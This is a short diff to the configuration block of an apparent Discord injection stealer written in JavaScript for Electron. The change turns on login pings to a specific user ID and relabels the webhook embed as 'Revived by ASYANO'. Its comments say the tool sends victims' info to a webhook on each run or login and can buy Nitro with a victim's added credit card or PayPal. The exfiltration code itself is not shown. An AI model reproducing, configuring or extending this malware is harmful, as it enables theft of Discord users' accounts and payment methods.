@@ -5,10 +5,10 @@ const querystring = require("querystring");
 const { BrowserWindow, session } = require("electron");
 
 const config = {
-  auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: "Discord Injection", //name of the webhook thats gonna send the info
+  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
+  ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
+  ping_val: "<@1062804772568182804>", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
+  embed_name: "Discord Injection [ ! ] - Revived by ASYANO : )", //name of the webhook thats gonna send the info
   embed_icon:
     "https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png".replace(
       / /g,
